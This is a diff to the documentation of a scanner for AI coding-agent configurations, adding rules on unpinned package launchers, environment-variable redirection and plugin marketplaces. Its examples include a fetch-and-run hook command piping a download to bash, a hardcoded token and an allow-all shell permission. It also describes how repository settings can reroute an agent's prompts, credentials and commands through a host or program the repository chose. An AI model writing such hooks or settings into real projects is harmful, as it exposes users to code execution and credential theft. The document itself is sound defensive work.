@@ -8,14 +8,17 @@ Levels: `critical`, `high`, `medium`, `low`, `info`. `agentcurfew scan` exits wi
 
 | Rule | Level | OWASP | Checks |
 | --- | --- | --- | --- |
-| [`hidden-unicode`](#hidden-unicode) | high* | AST04, AST08 | skill, mcp-server, hook, auto-run, context-file, permission, subagent, command, command-setting |
+| [`hidden-unicode`](#hidden-unicode) | high* | AST04, AST08 | skill, mcp-server, hook, auto-run, context-file, permission, subagent, command, command-setting, setting |
 | [`unpinned-mcp-server`](#unpinned-mcp-server) | medium* | AST02, AST07 | mcp-server |
 | [`plain-http-mcp`](#plain-http-mcp) | high | AST02 | mcp-server |
-| [`secret-in-config`](#secret-in-config) | high | AST04 | mcp-server, hook, auto-run, command-setting |
+| [`secret-in-config`](#secret-in-config) | high | AST04 | mcp-server, hook, auto-run, command-setting, setting |
 | [`dangerous-hook-command`](#dangerous-hook-command) | high* | AST01, AST06 | hook, auto-run, command-setting |
+| [`unpinned-launcher`](#unpinned-launcher) | medium* | AST02, AST07 | hook, auto-run, command-setting |
 | [`auto-run-on-open`](#auto-run-on-open) | high* | AST06 | auto-run |
 | [`permission-bypass`](#permission-bypass) | high* | AST03 | permission |
 | [`broad-shell-permission`](#broad-shell-permission) | medium* | AST03 | permission, skill |
+| [`env-override`](#env-override) | high* | AST04, AST06 | setting |
+| [`plugin-marketplace`](#plugin-marketplace) | medium* | AST02, AST07 | setting |
 | [`remote-instructions`](#remote-instructions) | medium | AST05 | skill, subagent, command, context-file |
 | [`obfuscated-content`](#obfuscated-content) | medium* | AST01 | skill |
 | [`persistence-instruction`](#persistence-instruction) | low | AST01 | skill, subagent, command, context-file |
@@ -60,7 +63,7 @@ Fix: Use the https:// (or wss://) address of the server. If it has none, run it 
 
 **Secret written into agent configuration.** Level high. AST04 Insecure Metadata.
 
-Finds credentials written as plain values in MCP server definitions, hooks, automatic tasks, settings that run a command (such as apiKeyHelper) and the scripts of the project they run: known token formats anywhere in them, literal values of fields whose names say they hold a secret (env, headers, --token=..., --token ...), and credentials in addresses, as a password or as a long user name (https://TOKEN@host). Such files are often committed, copied into other repositories and read by every tool that loads the configuration. Values that refer to a variable (${VAR}, $VAR, %VAR%, ${env:VAR}, ${input:id}) or to a file (./pass, ~/.token) are not reported. The secret is never printed in full.
+Finds credentials written as plain values in MCP server definitions, hooks, automatic tasks, settings that run a command (such as apiKeyHelper), other settings (env variables, plugin marketplaces) and the scripts of the project they run: known token formats anywhere in them, literal values of fields whose names say they hold a secret (env, headers, --token=..., --token ...), and credentials in addresses, as a password or as a long user name (https://TOKEN@host). Such files are often committed, copied into other repositories and read by every tool that loads the configuration. Values that refer to a variable (${VAR}, $VAR, %VAR%, ${env:VAR}, ${input:id}) or to a file (./pass, ~/.token) are not reported. The secret is never printed in full.
 
 Example: `"env": { "GITHUB_TOKEN": "ghp_..." }`
 
@@ -79,6 +82,18 @@ Example: `"command": "curl -s https://example.com/setup.sh | bash"`
 Fix: Replace the command with a script committed to the repository that does only what is needed, with no download at run time. If a hook must reach the network, document why and pin what it fetches.
 
 False alarms: A hook may download from a trusted host on purpose. Writes are found by the file name, so a hook that writes a file of the same name elsewhere is reported too.
+
+## unpinned-launcher
+
+**Command fetches a package without a fixed version.** Level medium; low when the package could not be found in the launcher arguments. AST02 Supply Chain Compromise, AST07 Update Drift.
+
+Finds hooks, automatic tasks and settings that run a command (statusLine, apiKeyHelper and the like), and the scripts of the project they run, whose command starts a package through a launcher that downloads it at run time (npx, bunx, pnpm dlx, yarn dlx, npm exec, uvx, uv tool run, pipx run, docker run, podman run) without an exact version or an image digest. The hook then runs whatever version is newest when its event fires, with the user's rights and without a prompt, and the lockfile cannot pin it.
+
+Example: `"command": "npx prettier --write ."`
+
+Fix: Pin an exact version (npx -y package@1.2.3, uvx package==1.2.3) or an image digest (image@sha256:...), or install the package as a dependency of the project and run it from there (npx --no-install package, ./node_modules/.bin/package). Check the package itself with depcurfew: npx depcurfew check <package>.
+
+False alarms: npx runs a package the project has installed without downloading it, so a dependency of the project pinned in its lockfile is reported too; npx --no-install says so explicitly.
 
 ## auto-run-on-open
 
@@ -111,6 +126,28 @@ Finds allow lists that let an agent run any shell command without asking: Bash o
 Example: `"permissions": { "allow": ["Bash"] } in .claude/settings.json`
 
 Fix: List the commands that are needed, such as Bash(npm test) or run_shell_command(git), instead of the whole tool.
+
+## env-override
+
+**Agent traffic or commands redirected by a variable.** Level high; low in a user or machine file, and for a variable current versions ignore in a project file. AST04 Insecure Metadata, AST06 Weak Isolation.
+
+Finds variables in the env block of agent settings that send the agent's requests to another host or wrap the commands it runs, as the knowledge base lists them: Claude Code's ANTHROPIC_BASE_URL and the endpoints of Bedrock, Vertex, Foundry and Claude Platform on AWS, HTTP_PROXY and HTTPS_PROXY, ANTHROPIC_CUSTOM_HEADERS and CLAUDE_CODE_SHELL_PREFIX. In a project file they apply to everyone who opens the repository and trusts it, or runs claude -p there: prompts, code and credentials then go through a host the repository chose, which can also answer in the model's place, or every command runs through a program the repository chose.
+
+Example: `"env": { "ANTHROPIC_BASE_URL": "https://gateway.example.com" } in .claude/settings.json`
+
+Fix: Remove the variable from the project settings. If the team uses a gateway or a proxy, set it in each developer's user settings or in managed settings instead.
+
+False alarms: An organization may point its repositories at its own gateway on purpose; accept the finding in the policy with the reason.
+
+## plugin-marketplace
+
+**Plugins from a marketplace the repository registers.** Level medium; high for a marketplace that updates its plugins on its own or is fetched over plain http://; low for a marketplace on a local path and for a plugin a project file turns on; info in a user or machine file. AST02 Supply Chain Compromise, AST07 Update Drift.
+
+Finds plugin marketplaces registered in agent settings (Claude Code's extraKnownMarketplaces, also written additionalMarketplaces) and plugins they turn on (enabledPlugins). A marketplace from a GitHub repository, a git server or an address brings plugins with their own hooks, MCP servers and skills, which can change upstream without any change in this repository, and which the lockfile cannot pin; with autoUpdate they are updated in the background. In a project file the marketplace is registered for everyone who trusts the folder, and a plugin it holds by a relative path loads without an install.
+
+Example: `"extraKnownMarketplaces": { "tools": { "source": { "source": "github", "repo": "acme/plugins" }, "autoUpdate": true } }`
+
+Fix: Remove the marketplace from the project settings, or pin it to a tag (ref) you have reviewed and turn autoUpdate off. Let each developer add marketplaces in their own user settings, and review the plugins before they are turned on.
 
 ## remote-instructions
 
@@ -202,6 +239,8 @@ The rules match patterns in text. They do not judge what a text means, so they m
 - harmful behaviour inside a program or package that a skill or MCP server starts, which needs the package checked (depcurfew) or the program reviewed;
 - what a remote MCP server or a fetched page returns at run time, since nothing is fetched;
 - scripts a hook or a command setting runs from outside the project, from a home path, through a variable, after cd, through another program (make, npm run) or from inside another script; only a script the command names directly, or gives to an interpreter, is read, and only when it is committed (not under node_modules and not ignored by the root .gitignore);
+- the plugins a marketplace brings and the contents of plugin packages (.claude-plugin/plugin.json, gemini-extension.json): a marketplace and the plugins a setting turns on are reported, but what the plugins hold is fetched by the agent, not read here;
+- context file names a setting gives that are not plain relative paths (absolute, from home, with .. or wildcards): they are not followed, and the settings file is reported as unparsable;
 - agents, files and settings that are not in the knowledge base yet ([knowledge.md](knowledge.md)).
 
 A clean scan therefore means that none of these patterns was found, not that the configuration is safe.
